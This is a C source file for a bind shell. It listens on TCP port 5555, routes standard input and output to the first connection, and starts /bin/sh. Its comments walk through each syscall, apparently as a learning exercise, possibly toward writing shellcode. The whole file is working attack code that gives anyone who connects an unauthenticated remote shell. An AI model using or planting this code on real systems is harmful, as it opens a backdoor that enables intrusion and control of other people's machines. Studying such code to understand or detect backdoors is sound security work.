#include <netinet/in.h>
#include <errno.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int main(void) {
    //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // Building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(5555);

    // Our second syscall, and perhaps the most complicated: bind()
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    //0 here is our specified backlog, (we dont have one)
    if(listen(listen_sock, 0) == -1) {
        perror("Failed to listen on sock");
        close(listen_sock);
        return errno;
    }

    //creating new var conn_sock which is returned from accept() and needed for the dup2() call which duplicates this for stdin, stdout, and stderr
    int conn_sock = accept(listen_sock, NULL, NULL);
    if(conn_sock == -1) {
         perror("Failed to accept connection");
         close(listen_sock);
         return errno;
    }

    // Our fifth syscall, dup2(), is used 3 times
    if(dup2(conn_sock, STDIN_FILENO) == -1) {
         perror("Failed to create copy of stdin");
         close(conn_sock);
         close(listen_sock);
         return errno;
    }

    if(dup2(conn_sock, STDOUT_FILENO) == -1) {
         perror("Failed to create copy of stdout");
         close(conn_sock);
         close(listen_sock);
         return errno;
    }

    if(dup2(conn_sock, STDERR_FILENO) == -1) {
         perror("Failed to create copy of stderr");
         close(conn_sock);
         close(listen_sock);
         return errno;
    }

    char *argv[] = { NULL };
    char *envp[] = { NULL };

    // Our final syscall is execve(), which runs a program fed to it as a string
    if(execve("/bin/sh", argv, envp) == -1) {
         perror("Failed to start shell");
         close(conn_sock);
         close(listen_sock);
         return errno;
    }

    close(conn_sock);
    close(listen_sock);

    return 0;
}
